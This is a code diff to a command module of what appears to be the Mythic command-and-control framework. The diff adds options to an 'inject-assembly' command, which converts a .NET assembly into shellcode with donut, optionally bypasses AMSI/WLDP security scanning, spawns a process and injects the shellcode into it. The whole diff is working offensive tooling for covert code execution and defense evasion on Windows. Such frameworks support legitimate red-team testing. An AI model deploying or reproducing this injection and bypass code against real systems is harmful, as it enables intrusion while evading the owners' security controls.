@@ -16,8 +16,35 @@ class InjectAssemblyArguments(TaskArguments):
             CommandParameter(
                 name="file",
                 type=ParameterType.File,
-                description="",
+                description="The assembly to inject",
                 parameter_group_info=[ParameterGroupInfo(ui_position=1)],
+            ),
+            CommandParameter(
+                name="arch",
+                type=ParameterType.Number,
+                description="Target architecture for loader : 1=x86, 2=amd64, 3=x86+amd64 (default)",
+                default_value=3,
+                parameter_group_info=[
+                    ParameterGroupInfo(required=False)
+                ],
+            ),
+            CommandParameter(
+                name="bypass",
+                type=ParameterType.Number,
+                description="Behavior for bypassing AMSI/WLDP : 1=None, 2=Abort on fail, 3=Continue on fail (default)",
+                default_value=3,
+                parameter_group_info=[
+                    ParameterGroupInfo(required=False)
+                ],
+            ),
+            CommandParameter(
+                name="exit_opt",
+                type=ParameterType.Number,
+                description="Determines how the loader should exit. 1=exit thread, 2=exit process (default), 3=Do not exit or cleanup and block indefinitely",
+                default_value = 2,
+                parameter_group_info=[
+                    ParameterGroupInfo(required=False)
+                ],
             ),
             # CommandParameter(
             #     name="processID",
@@ -28,21 +55,24 @@ class InjectAssemblyArguments(TaskArguments):
             CommandParameter(
                 name="processName",
                 type=ParameterType.String,
-                description="",
+                description = "The process to spawn and inject into",
                 parameter_group_info=[ParameterGroupInfo(ui_position=2)],
             ),
             CommandParameter(
                 name="arguments",
                 type=ParameterType.String,
-                description="Arguments that are passed to the assembly",
-                parameter_group_info=[ParameterGroupInfo(ui_position=2)],
+                description = "Arguments that are passed to the assembly",
+                default_value = "",
+                parameter_group_info=[
+                    ParameterGroupInfo(required=False)
+                ],
             ),
-            CommandParameter(
-                name="output",
-                type=ParameterType.Boolean,
-                description="Get assembly output",
-                parameter_group_info=[ParameterGroupInfo(ui_position=2)],
-            )
+            # CommandParameter(
+            #     name="output",
+            #     type=ParameterType.Boolean,
+            #     description="Get assembly output",
+            #     parameter_group_info=[ParameterGroupInfo(ui_position=2)],
+            # )
         ]
 
     # you must implement this function so that you can parse out user typed input into your paramters or load your parameters based on some JSON input
@@ -72,7 +102,7 @@ class InjectAssemblyCommand(CommandBase):
     browser_script = None
     attributes = CommandAttributes(
         supported_os=[SupportedOS.Windows],
-        builtin=True
+        builtin=False
     )
 
     async def create_tasking(self, task: MythicTask) -> MythicTask:
@@ -92,36 +122,30 @@ class InjectAssemblyCommand(CommandBase):
 
         shellcode = donut.create(
             file=os.path.join(tempDir.name, "assembly.exe"),
-            arch=3,
-            bypass=3,
+            arch=task.args.get_arg("arch"),
+            bypass=task.args.get_arg("bypass"),
             params = task.args.get_arg("arguments"),
-            exit_opt = 2,
+            exit_opt = task.args.get_arg("exit_opt"),
         )
 
         fileCreate = MythicRPCFileCreateMessage(task.id, DeleteAfterFetch = True, FileContents = shellcode, Filename = "shellcode.bin")
-
-    
-
-        # fileCreate.FileContents = shellcode
-        # fileCreate.Filename = "shellcode.bin"
-        # fileCreate.TaskID = task.id
-        # fileCreate.DeleteAfterFetch = True
 
         shellcodeFile = await SendMythicRPCFileCreate(fileCreate)
 
         if not shellcodeFile.Success:
             raise Exception("Failed to create file: " + shellcodeFile.Error)
 
-        print(shellcodeFile.AgentFileId)
-        #createSubtaskMessage = MythicRPCTaskCreateSubtaskMessage(task.id, CommandName="shellcode-inject", Params=json.dumps({"file": shellcodeFile.AgentFileId, "processName": task.args.get_arg("processName"), "output": str(task.args.get_arg("output"))}), Token=task.token)
         createSubtaskMessage = MythicRPCTaskCreateSubtaskMessage(task.id, 
                                                                  CommandName="shellcode-inject", 
-                                                                 Params=json.dumps({"file": shellcodeFile.AgentFileId, "processName": task.args.get_arg("processName")}), 
+                                                                 Params=json.dumps(
+                                                                    {"file": shellcodeFile.AgentFileId, 
+                                                                     "processName": task.args.get_arg("processName")}), 
                                                                  Token=task.token)
 
-        blah = await SendMythicRPCTaskCreateSubtask(createSubtaskMessage)
-        if not blah.Success:
-            raise Exception("Failed to create subtask: " + blah.Error)
+        subtask = await SendMythicRPCTaskCreateSubtask(createSubtaskMessage)
+
+        if not subtask.Success:
+            raise Exception("Failed to create subtask: " + subtask.Error)
         
         return task
 
